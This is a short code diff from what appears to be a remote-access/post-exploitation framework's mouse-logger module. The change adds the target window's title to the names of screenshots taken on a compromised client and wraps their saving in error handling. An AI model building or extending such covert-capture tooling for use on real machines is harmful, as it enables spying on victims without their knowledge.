@@ -64,10 +64,13 @@ class MouseLoggerModule(PupyModule):
 
 				self.success("%s screenshots taken"%len(screenshots_list))
 				print str(screenshots_list)[0:50]
-				for d, height, width, buf in screenshots_list:
-					filepath=os.path.join("data","mouselogger","scr_"+self.client.short_name()+"_"+str(d).replace(" ","_").replace(":","-")+".jpg")
-					pil_save(filepath, buf, width, height)
-					self.info("screenshot saved to %s"%filepath)
+				for d, height, width, exe, win_title, buf in screenshots_list:
+					try:
+						filepath=os.path.join("data","mouselogger","scr_"+self.client.short_name()+"_"+str(unicode(win_title, errors="ignore")).replace(" ","_").replace("\\","").replace("/","")+"_"+str(d).replace(" ","_").replace(":","-")+".jpg")
+						pil_save(filepath, buf, width, height)
+						self.info("screenshot saved to %s"%filepath)
+					except Exception as e:
+						self.error("Error saving a screenshot: %s"%str(e))
 			elif args.action=="stop":
 				self.mouselogger.stop()
 				self.job.stop()
